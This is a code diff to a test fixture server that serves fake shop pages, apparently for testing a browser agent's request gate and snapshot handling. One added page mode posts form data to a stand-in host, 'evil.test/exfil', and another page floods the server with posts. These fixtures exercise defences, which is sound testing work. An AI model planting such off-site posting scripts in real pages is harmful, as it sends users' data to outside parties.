@@ -203,6 +203,19 @@ line two</textarea></label><label>File <input type="file" name="doc"></label><bu
         );
       case 'shop.test/send':
         return send(200, html(`<h1>Message sent</h1><p>${body}</p>`, 'Sent'));
+      case 'shop.test/script-form': {
+        // a form that a script sends in place of the browser, in each way that real sites use, and a page that sends
+        // other data to an off-list site at the click.
+        const handlers: Record<string, string> = {
+          sync: `f.onsubmit = (e) => { e.preventDefault(); fetch('/api/order', { method: 'POST', body: new FormData(f) }); };`,
+          await: `f.onsubmit = async (e) => { e.preventDefault(); await new Promise((r) => setTimeout(r, 300)); fetch('/api/order', { method: 'POST', body: new FormData(f) }); };`,
+          delayed: `f.onsubmit = (e) => { e.preventDefault(); setTimeout(() => f.submit(), 300); };`,
+          blank: `f.target = '_blank';`,
+          offsite: `f.onsubmit = (e) => { e.preventDefault(); fetch('${at('evil.test', '/exfil')}', { method: 'POST', body: 'qty=CHANGED' }); };`,
+        };
+        const mode = new URL(path, 'http://x').searchParams.get('mode') ?? 'sync';
+        return send(200, html(`<form id="f" action="/order" method="post"><label>Qty <input name="qty" value="1"></label><button>Place order</button></form><script>${handlers[mode]}</script>`, 'Checkout'));
+      }
       case 'shop.test/freeze':
         // the page hangs a moment after the click, when no step runs.
         return send(200, html('<button onclick="setTimeout(() => { for (;;) {} }, 500)">Freeze</button><p>calm</p>', 'Freeze'));
@@ -243,8 +256,9 @@ line two</textarea></label><label>File <input type="file" name="doc"></label><bu
           ),
         );
       case 'shop.test/flood':
-        // the gate blocks each post, and the page never stops.
-        return send(200, html(`<h1>Flood</h1><script>setInterval(() => { for (let i = 0; i < 20; i++) fetch('/api/x?' + Math.random(), { method: 'POST', body: 'x' }).catch(() => {}); }, 5)</script>`, 'Flood'));
+        // the gate blocks each post, and the page never stops. about 250 posts a second is more than the list keeps in
+        // 2 s, and a busy pc can still answer the snapshot.
+        return send(200, html(`<h1>Flood</h1><script>setInterval(() => { for (let i = 0; i < 5; i++) fetch('/api/x?' + Math.random(), { method: 'POST', body: 'x' }).catch(() => {}); }, 20)</script>`, 'Flood'));
       case 'shop.test/pw-space': {
         // the snapshot changes the white space of a value: it trims it, and it shows a tab or a line separator as a space.
         const values = [` ${FIXTURE_PASSWORD}A `, `${FIXTURE_PASSWORD}B x`, `${FIXTURE_PASSWORD}C\tx`, `-${FIXTURE_PASSWORD}D"x: y`];
